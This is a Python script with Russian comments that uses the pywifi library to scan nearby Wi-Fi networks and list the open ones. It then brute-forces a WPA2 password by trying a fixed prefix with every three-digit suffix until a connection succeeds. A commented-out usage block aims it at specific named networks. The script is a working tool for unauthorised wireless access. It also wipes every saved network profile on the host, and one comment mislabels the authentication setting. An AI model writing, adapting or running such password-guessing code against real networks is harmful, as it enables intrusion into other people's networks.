import pywifi
from pywifi import const
import time


def scan_wifi_networks():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    # Старт сканирования
    iface.scan()

    # Ожидание завершения сканирования
    scan_result = iface.scan_results()

    # Переменная для отслеживания наличия открытых сетей
    open_networks = []
    scan_result = sorted(scan_result, key=lambda x: x.signal, reverse=True)

    # Вывод информации о найденных сетях
    for ind, network in enumerate(scan_result):
#        print(f"Network: {dir(network)}")
        print(f"{ind + 1}. {network.ssid}")
        print(f"Signal: {network.signal}")
        print("Шифрование сети:", network.akm[0] if network.akm else "Отсутствует")
        print(f"Freq: {network.freq / 1000000:,.2f} Ghz\n")
#        print("MAC-адрес:", network.bssid)
#        print("Аутентификация:", network.auth)
#        print(f"Key: {network.key}")
#        print("=" * 30)

        # Проверка наличия открытой сети
        if not network.akm:
            open_networks.append(network)

    return open_networks, scan_result

open_networks, scan_wi_fi_dots = scan_wifi_networks()

print("\nOpen Networks:")
for network in open_networks:
    print(network.ssid)

print(f"\nTotal Networks: {len(scan_wi_fi_dots)}")


def generate_passwords():
    # Фиксированная часть пароля
    fixed_part = "qwerty1234567"

    # Генерация всех возможных комбинаций последних трех цифр
    for i in range(1000):
        yield f"{fixed_part}{i:03d}"

def test_password(ssid, password):
    # Инициализация PyWiFi
    wifi = pywifi.PyWiFi()

    # Получение объекта интерфейса
    iface = wifi.interfaces()[0]

    # Выключение Wi-Fi
    iface.disconnect()

    # Создание профиля сети
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_SHARED  # Изменено на WPA2-PSK
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    # Удаление всех существующих профилей
    iface.remove_all_network_profiles()

    # Добавление нового профиля
    tmp_profile = iface.add_network_profile(profile)

    # Подключение к сети
    iface.connect(tmp_profile)

    # Проверка успешности подключения
    time.sleep(0.3)
    if iface.status() == const.IFACE_CONNECTED:
        print(f"Успешное подключение к сети {ssid} с паролем {password}")
        return True
    else:
        print(f"Не удалось подключиться к сети {ssid} с паролем {password}")
        return False

# Пример использования
#ssid = "Aesthetic Slow"
#ssid = "ASUS"
#password_generator = generate_passwords()

#for password in password_generator:
#    if test_password(ssid, password):
#        break

#test_password("ASUS", "qwerty1234567890")
